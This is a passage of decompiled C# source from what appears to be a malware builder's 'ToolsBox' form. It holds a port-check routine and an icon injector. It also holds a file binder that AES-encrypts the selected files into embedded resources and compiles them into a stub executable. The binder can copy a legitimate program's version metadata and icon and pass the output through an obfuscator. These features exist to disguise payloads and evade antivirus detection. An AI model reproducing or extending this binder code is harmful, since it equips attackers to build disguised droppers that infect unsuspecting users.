					}
					catch (SocketException ex2)
					{
						this.Guna2TextBox4.ForeColor = Color.Red;
						this.Guna2TextBox4.Text = "Error: I could not see your service on " + SettingsHelper.IP + " on port " + Conversions.ToString(Port);
						bool notef3 = SettingsHelper.NOTEF;
						if (notef3)
						{
							MyProject.Forms.Main.NotifyIcon1.BalloonTipText = "Refused " + SettingsHelper.IP + ":" + Conversions.ToString(Port);
							MyProject.Forms.Main.NotifyIcon1.ShowBalloonTip(100);
						}
						TcpClient sockets2 = this.Sockets;
						if (sockets2 != null)
						{
							sockets2.Close();
						}
						this.Sockets = null;
					}
				});
			}
			catch (Exception ex)
			{
				this.Guna2TextBox4.ForeColor = Color.Red;
				this.Guna2TextBox4.Text = ex.Message;
			}
			this.Guna2GradientButton2.Enabled = true;
		}

		// Token: 0x06000930 RID: 2352 RVA: 0x0004FD1C File Offset: 0x0004DF1C
		private void Guna2GradientButton4_Click(object sender, EventArgs e)
		{
			OpenFileDialog openFileDialog = new OpenFileDialog();
			OpenFileDialog openFileDialog2 = openFileDialog;
			openFileDialog2.Filter = "(*.exe;*.ico;)|*.exe;*.ico";
			openFileDialog2.InitialDirectory = Application.StartupPath + "\\Icons";
			bool flag = openFileDialog.ShowDialog() == DialogResult.OK;
			if (flag)
			{
				bool flag2 = openFileDialog.FileName.EndsWith(".exe");
				if (flag2)
				{
					this.Guna2TextBox6.Text = Helper.GetIcon(openFileDialog.FileName);
					this.PictureBox2.ImageLocation = this.Guna2TextBox6.Text;
					GC.Collect();
				}
				else
				{
					this.Guna2TextBox6.Text = openFileDialog.FileName;
					this.PictureBox2.ImageLocation = this.Guna2TextBox6.Text;
				}
			}
			else
			{
				this.Guna2TextBox6.Text = "...";
				this.PictureBox2.Image = null;
			}
		}

		// Token: 0x06000931 RID: 2353 RVA: 0x0004FE00 File Offset: 0x0004E000
		private void Guna2GradientButton6_Click(object sender, EventArgs e)
		{
			try
			{
				bool flag = Operators.CompareString(this.Guna2TextBox6.Text, null, false) == 0 | Operators.CompareString(this.Guna2TextBox5.Text, null, false) == 0 | Operators.CompareString(this.Guna2TextBox6.Text, "...", false) == 0 | Operators.CompareString(this.Guna2TextBox5.Text, "...", false) == 0;
				if (!flag)
				{
					IconInjector.InjectIcon(this.Guna2TextBox5.Text, this.Guna2TextBox6.Text);
					MessageBox.Show(this.Guna2TextBox5.Text, "DONE!");
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x06000932 RID: 2354 RVA: 0x0004FED8 File Offset: 0x0004E0D8
		private void Guna2GradientButton3_Click(object sender, EventArgs e)
		{
			OpenFileDialog openFileDialog = new OpenFileDialog();
			OpenFileDialog openFileDialog2 = openFileDialog;
			openFileDialog2.Filter = "(*.exe|*.exe";
			bool flag = openFileDialog.ShowDialog() == DialogResult.OK;
			if (flag)
			{
				this.Guna2TextBox5.Text = openFileDialog.FileName;
			}
			else
			{
				this.Guna2TextBox5.Text = "...";
			}
		}

		// Token: 0x06000933 RID: 2355 RVA: 0x0004FF34 File Offset: 0x0004E134
		private void AddToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			OpenFileDialog openFileDialog = new OpenFileDialog();
			OpenFileDialog openFileDialog2 = openFileDialog;
			openFileDialog2.Filter = "(*.*|*.*";
			openFileDialog2.Multiselect = true;
			bool flag = openFileDialog.ShowDialog() == DialogResult.OK;
			if (flag)
			{
				foreach (string text in openFileDialog.FileNames)
				{
					try
					{
						Icon icon = Icon.ExtractAssociatedIcon(text);
						bool flag2 = icon != null;
						if (flag2)
						{
							this.ImageList2.Images.Add(icon);
						}
					}
					catch (Exception ex)
					{
						Debug.WriteLine(ex.Message);
					}
					ListViewItem listViewItem = this.L1.Items.Add(text, checked(this.ImageList2.Images.Count - 1));
					listViewItem.SubItems.Add(ToolsBox.GetFileSize(text));
					listViewItem.SubItems.Add("True");
					listViewItem.SubItems.Add("False");
				}
				GC.Collect();
			}
			this.L1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
		}

		// Token: 0x06000934 RID: 2356 RVA: 0x0005006C File Offset: 0x0004E26C
		private void RemoveToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			try
			{
				try
				{
					foreach (object obj in this.L1.SelectedItems)
					{
						ListViewItem listViewItem = (ListViewItem)obj;
						this.L1.Items.RemoveAt(listViewItem.Index);
					}
				}
				finally
				{
					IEnumerator enumerator;
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
			}
			catch (Exception ex)
			{
				Debug.WriteLine(ex.Message);
			}
		}

		// Token: 0x06000935 RID: 2357 RVA: 0x00050110 File Offset: 0x0004E310
		private void ToolStripMenuItem7_Click(object sender, EventArgs e)
		{
			this.L1.Items.Clear();
		}

		// Token: 0x06000936 RID: 2358 RVA: 0x00050124 File Offset: 0x0004E324
		public static string GetFileSize(string TheFile)
		{
			bool flag = TheFile.Length == 0;
			checked
			{
				string result;
				if (flag)
				{
					result = "";
				}
				else
				{
					bool flag2 = !File.Exists(TheFile);
					if (flag2)
					{
						result = "";
					}
					else
					{
						ulong num = (ulong)MyProject.Computer.FileSystem.GetFileInfo(TheFile).Length;
						result = Helper.BytesToString((long)num);
					}
				}
				return result;
			}
		}

		// Token: 0x06000937 RID: 2359 RVA: 0x00050180 File Offset: 0x0004E380
		public static string Randomi(int lenght)
		{
			string text = "asdfghjklqwertyuiopmnbvcxz";
			StringBuilder stringBuilder = new StringBuilder();
			checked
			{
				for (int i = 1; i <= lenght; i++)
				{
					int startIndex = ToolsBox.rand.Next(0, text.Length);
					stringBuilder.Append(text.Substring(startIndex, 1));
				}
				return stringBuilder.ToString();
			}
		}

		// Token: 0x06000938 RID: 2360 RVA: 0x000501DC File Offset: 0x0004E3DC
		private void L1_DragDrop(object sender, DragEventArgs e)
		{
			string[] array = (string[])e.Data.GetData(DataFormats.FileDrop);
			foreach (string text in array)
			{
				bool flag = File.Exists(text);
				if (flag)
				{
					try
					{
						Icon icon = Icon.ExtractAssociatedIcon(text);
						bool flag2 = icon != null;
						if (flag2)
						{
							this.ImageList2.Images.Add(icon);
						}
					}
					catch (Exception ex)
					{
						Debug.WriteLine(ex.Message);
					}
					ListViewItem listViewItem = this.L1.Items.Add(text, checked(this.ImageList2.Images.Count - 1));
					listViewItem.SubItems.Add(ToolsBox.GetFileSize(text));
					listViewItem.SubItems.Add("True");
					listViewItem.SubItems.Add("False");
				}
			}
			GC.Collect();
			this.L1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
		}

		// Token: 0x06000939 RID: 2361 RVA: 0x000502FC File Offset: 0x0004E4FC
		private void L1_DragEnter(object sender, DragEventArgs e)
		{
			bool dataPresent = e.Data.GetDataPresent(DataFormats.FileDrop);
			if (dataPresent)
			{
				e.Effect = DragDropEffects.Copy;
			}
		}

		// Token: 0x0600093A RID: 2362 RVA: 0x00050328 File Offset: 0x0004E528
		private void TrueToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				try
				{
					foreach (object obj in this.L1.SelectedItems)
					{
						ListViewItem listViewItem = (ListViewItem)obj;
						listViewItem.SubItems[2].Text = "True";
					}
				}
				finally
				{
					IEnumerator enumerator;
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
			}
			catch (Exception ex)
			{
				Debug.WriteLine(ex.Message);
			}
		}

		// Token: 0x0600093B RID: 2363 RVA: 0x000503CC File Offset: 0x0004E5CC
		private void FalseToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				try
				{
					foreach (object obj in this.L1.SelectedItems)
					{
						ListViewItem listViewItem = (ListViewItem)obj;
						listViewItem.SubItems[2].Text = "False";
						listViewItem.SubItems[3].Text = "False";
					}
				}
				finally
				{
					IEnumerator enumerator;
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
			}
			catch (Exception ex)
			{
				Debug.WriteLine(ex.Message);
			}
		}

		// Token: 0x0600093C RID: 2364 RVA: 0x00050484 File Offset: 0x0004E684
		private void TrueToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			try
			{
				try
				{
					foreach (object obj in this.L1.SelectedItems)
					{
						ListViewItem listViewItem = (ListViewItem)obj;
						bool flag = Operators.CompareString(listViewItem.SubItems[2].Text, "True", false) == 0;
						if (flag)
						{
							listViewItem.SubItems[3].Text = "True";
						}
					}
				}
				finally
				{
					IEnumerator enumerator;
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
			}
			catch (Exception ex)
			{
				Debug.WriteLine(ex.Message);
			}
		}

		// Token: 0x0600093D RID: 2365 RVA: 0x0005054C File Offset: 0x0004E74C
		private void FalseToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			try
			{
				try
				{
					foreach (object obj in this.L1.SelectedItems)
					{
						ListViewItem listViewItem = (ListViewItem)obj;
						listViewItem.SubItems[3].Text = "False";
					}
				}
				finally
				{
					IEnumerator enumerator;
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
			}
			catch (Exception ex)
			{
				Debug.WriteLine(ex.Message);
			}
		}

		// Token: 0x0600093E RID: 2366 RVA: 0x000505F0 File Offset: 0x0004E7F0
		private void Guna2GradientButton5_Click(object sender, EventArgs e)
		{
			bool flag = this.L1.Items.Count > 0;
			checked
			{
				if (flag)
				{
					try
					{
						SaveFileDialog saveFileDialog = new SaveFileDialog
						{
							Filter = ".exe (*.exe)|*.exe",
							OverwritePrompt = false,
							FileName = "Output"
						};
						bool flag2 = saveFileDialog.ShowDialog() == DialogResult.OK;
						if (flag2)
						{
							StringBuilder stringBuilder = new StringBuilder();
							Random random = new Random();
							int num = 1;
							do
							{
								int index = random.Next(0, ToolsBox.validchars.Length);
								char value = ToolsBox.validchars[index];
								stringBuilder.Append(value);
								num++;
							}
							while (num <= 17);
							ToolsBox.key = stringBuilder.ToString();
							this.Compiler(saveFileDialog.FileName, Conversions.ToString(ToolsBox.Resources_Parent));
						}
					}
					catch (Exception ex)
					{
						MessageBox.Show(ex.Message);
					}
				}
			}
		}

		// Token: 0x0600093F RID: 2367 RVA: 0x000506EC File Offset: 0x0004E8EC
		public void Compiler(string Path, string Res)
		{
			try
			{
				VBCodeProvider vbcodeProvider = new VBCodeProvider(new Dictionary<string, string>
				{
					{
						"CompilerVersion",
						"v4.0"
					}
				});
				CompilerParameters compilerParameters = new CompilerParameters();
				string compilerOptions = " /target:winexe /platform:anycpu /nowarn";
				CompilerParameters compilerParameters2 = compilerParameters;
				compilerParameters2.GenerateExecutable = true;
				compilerParameters2.OutputAssembly = Path;
				compilerParameters2.CompilerOptions = compilerOptions;
				compilerParameters2.IncludeDebugInformation = false;
				compilerParameters2.ReferencedAssemblies.Add("System.Windows.Forms.dll");
				compilerParameters2.ReferencedAssemblies.Add("system.dll");
				compilerParameters2.ReferencedAssemblies.Add("Microsoft.VisualBasic.dll");
				string text = Resources.Binder;
				text = text.Replace("#ParentRes", Conversions.ToString(ToolsBox.Resources_Parent));
				text = text.Replace("%Path%", this.Guna2ComboBox2.Text);
				text = text.Replace("%Mutex%", ToolsBox.key);
				text = text.Replace("%SPL%", ToolsBox.SPL);
				bool @checked = this.Guna2CheckBox1.Checked;
				if (@checked)
				{
					FileVersionInfo versionInfo = FileVersionInfo.GetVersionInfo(ToolsBox.assmb);
					text = Strings.Replace(text, "%Title%", versionInfo.FileDescription, 1, -1, CompareMethod.Binary);
					text = Strings.Replace(text, "%Des%", versionInfo.Comments, 1, -1, CompareMethod.Binary);
					text = Strings.Replace(text, "%Company%", versionInfo.CompanyName, 1, -1, CompareMethod.Binary);
					text = Strings.Replace(text, "%Product%", versionInfo.ProductName, 1, -1, CompareMethod.Binary);
					text = Strings.Replace(text, "%Copyright%", versionInfo.LegalCopyright, 1, -1, CompareMethod.Binary);
					text = Strings.Replace(text, "%Trademark%", versionInfo.LegalTrademarks, 1, -1, CompareMethod.Binary);
					text = Strings.Replace(text, "%Guid%", Guid.NewGuid().ToString(), 1, -1, CompareMethod.Binary);
					text = text.Replace("%v1%", versionInfo.FileMajorPart.ToString());
					text = text.Replace("%v2%", versionInfo.FileMinorPart.ToString());
					text = text.Replace("%v3%", versionInfo.FileBuildPart.ToString());
					text = text.Replace("%v4%", versionInfo.FilePrivatePart.ToString());
				}
				else
				{
					text = Strings.Replace(text, "%Title%", null, 1, -1, CompareMethod.Binary);
					text = Strings.Replace(text, "%Des%", null, 1, -1, CompareMethod.Binary);
					text = Strings.Replace(text, "%Company%", null, 1, -1, CompareMethod.Binary);
					text = Strings.Replace(text, "%Product%", null, 1, -1, CompareMethod.Binary);
					text = Strings.Replace(text, "%Copyright%", null, 1, -1, CompareMethod.Binary);
					text = Strings.Replace(text, "%Trademark%", null, 1, -1, CompareMethod.Binary);
					text = Strings.Replace(text, "%Guid%", Guid.NewGuid().ToString(), 1, -1, CompareMethod.Binary);
					text = text.Replace("%v1%", Conversions.ToString(1));
					text = text.Replace("%v2%", Conversions.ToString(0));
					text = text.Replace("%v3%", Conversions.ToString(0));
					text = text.Replace("%v4%", Conversions.ToString(0));
				}
				string text2 = null;
				using (ResourceWriter resourceWriter = new ResourceWriter(Path.GetTempPath() + "\\" + Res + ".Resources"))
				{
					try
					{
						foreach (object obj in this.L1.Items)
						{
							ListViewItem listViewItem = (ListViewItem)obj;
							string text3 = listViewItem.SubItems[0].Text;
							string text4 = listViewItem.SubItems[2].Text;
							string text5 = listViewItem.SubItems[3].Text;
							string fileName = Path.GetFileName(text3);
							resourceWriter.AddResource(fileName, ToolsBox.AES_Encryptor(File.ReadAllBytes(text3)));
							text2 = string.Concat(new string[]
							{
								text2,
								"\"",
								fileName,
								ToolsBox.SPL,
								text4,
								ToolsBox.SPL,
								text5,
								"\","
							});
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
					resourceWriter.Generate();
					text = text.Replace("\"%list%\"", text2.Trim().TrimEnd(new char[]
					{
						','
					}));
				}
				compilerParameters2.EmbeddedResources.Add(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Path.GetTempPath() + "\\", ToolsBox.Resources_Parent), ".Resources")));
				CompilerResults compilerResults = vbcodeProvider.CompileAssemblyFromSource(compilerParameters, new string[]
				{
					text
				});
				bool flag = compilerResults.Errors.Count > 0;
				if (flag)
				{
					try
					{
						foreach (object obj2 in compilerResults.Errors)
						{
							object objectValue = RuntimeHelpers.GetObjectValue(obj2);
							Interaction.MsgBox(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue, null, "ErrorText", new object[0], null, null, null)), MsgBoxStyle.Critical, null);
						}
					}
					finally
					{
						IEnumerator enumerator2;
						if (enumerator2 is IDisposable)
						{
							(enumerator2 as IDisposable).Dispose();
						}
					}
				}
				compilerParameters2 = null;
				string path = Path.GetTempPath() + "\\" + Res + ".Resources";
				bool flag2 = File.Exists(path);
				if (flag2)
				{
					File.Delete(path);
				}
				bool checked2 = this.Guna2CheckBox2.Checked;
				if (checked2)
				{
					IconInjector.InjectIcon(Path, ToolsBox.iconpath);
				}
				bool checked3 = this.Guna2CheckBox3.Checked;
				if (checked3)
				{
					Debug.WriteLine(Obfuscator.Save(File.ReadAllBytes(Path), Path));
				}
				GC.Collect();
				FileInfo fileInfo = new FileInfo(Path);
				MessageBox.Show(Path, "DONE! : " + Helper.BytesToString(fileInfo.Length));
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x06000940 RID: 2368 RVA: 0x00050D50 File Offset: 0x0004EF50
		private static byte[] AES_Encryptor(byte[] input)
		{
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			MD5CryptoServiceProvider md5CryptoServiceProvider = new MD5CryptoServiceProvider();
			byte[] result;
			try
			{
				rijndaelManaged.Key = md5CryptoServiceProvider.ComputeHash(Encoding.UTF8.GetBytes(ToolsBox.key));
				rijndaelManaged.Mode = CipherMode.ECB;
				ICryptoTransform cryptoTransform = rijndaelManaged.CreateEncryptor();
				result = cryptoTransform.TransformFinalBlock(input, 0, input.Length);
			}
			catch (Exception ex)
			{
				Debug.WriteLine(ex.Message);
			}
			return result;
		}

		// Token: 0x06000941 RID: 2369 RVA: 0x00050DD8 File Offset: 0x0004EFD8
		private void Guna2CheckBox2_CheckedChanged(object sender, EventArgs e)
		{
			bool @checked = this.Guna2CheckBox2.Checked;
			if (@checked)
			{
				OpenFileDialog openFileDialog = new OpenFileDialog();
				OpenFileDialog openFileDialog2 = openFileDialog;
				openFileDialog2.Filter = "(*.exe;*.ico;)|*.exe;*.ico";
				openFileDialog2.InitialDirectory = Application.StartupPath + "\\Icons";
				bool flag = openFileDialog.ShowDialog() == DialogResult.OK;
				if (flag)
				{
					bool flag2 = openFileDialog.FileName.EndsWith(".exe");
					if (flag2)
					{
						ToolsBox.iconpath = Helper.GetIcon(openFileDialog.FileName);
						this.PictureBox3.ImageLocation = ToolsBox.iconpath;
					}
					else
					{
						ToolsBox.iconpath = openFileDialog.FileName;
						this.PictureBox3.ImageLocation = ToolsBox.iconpath;
					}
				}
				else
				{
					ToolsBox.iconpath = null;
					this.PictureBox3.Image = null;
					this.Guna2CheckBox2.Checked = false;
				}
			}
			bool flag3 = !this.Guna2CheckBox2.Checked;
			if (flag3)
			{
				ToolsBox.iconpath = null;
				this.PictureBox3.Image = null;
				this.Guna2CheckBox2.Checked = false;
			}
		}

		// Token: 0x06000942 RID: 2370 RVA: 0x00050EE8 File Offset: 0x0004F0E8
		private void Guna2CheckBox1_CheckedChanged(object sender, EventArgs e)
		{
			bool @checked = this.Guna2CheckBox1.Checked;
			if (@checked)
			{
				OpenFileDialog openFileDialog = new OpenFileDialog();
				OpenFileDialog openFileDialog2 = openFileDialog;
				openFileDialog2.Filter = "(*.exe|*.exe";
				bool flag = openFileDialog.ShowDialog() == DialogResult.OK;
				if (flag)
				{
					ToolsBox.assmb = openFileDialog.FileName;
				}
				else
				{
					ToolsBox.assmb = null;
					this.Guna2CheckBox1.Checked = false;
				}
			}
			bool flag2 = !this.Guna2CheckBox1.Checked;
			if (flag2)
			{
				ToolsBox.assmb = null;
				this.Guna2CheckBox1.Checked = false;
			}
		}

		// Token: 0x06000943 RID: 2371 RVA: 0x00050F78 File Offset: 0x0004F178
		private void L1_KeyDown(object sender, KeyEventArgs e)
		{
			try
			{
				bool flag = e.Modifiers == Keys.Control && e.KeyCode == Keys.A;
				if (flag)
				{
					bool flag2 = this.L1.Items.Count > 0;
					if (flag2)
					{
						try
						{
							foreach (object obj in this.L1.Items)
							{
								ListViewItem listViewItem = (ListViewItem)obj;
								listViewItem.Selected = true;
							}
						}
						finally
						{
							IEnumerator enumerator;
							if (enumerator is IDisposable)
							{
								(enumerator as IDisposable).Dispose();
							}
						}
					}
				}
			}
			catch (Exception ex)
			{
				Debug.WriteLine(ex.Message);
			}
		}

		// Token: 0x040003D6 RID: 982
		public static string validchars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";

		// Token: 0x040003D7 RID: 983
		public static Random rand = new Random();

		// Token: 0x040003D8 RID: 984
		public static object Resources_Parent = ToolsBox.Randomi(ToolsBox.rand.Next(3, 16));

		// Token: 0x040003D9 RID: 985
		public static string assmb;

		// Token: 0x040003DA RID: 986
		public static string iconpath;

		// Token: 0x040003DB RID: 987
		public static string key;

		// Token: 0x040003DC RID: 988
		private static string SPL = "-=>";

		// Token: 0x040003DD RID: 989
		private TcpClient Sockets;
	}
}
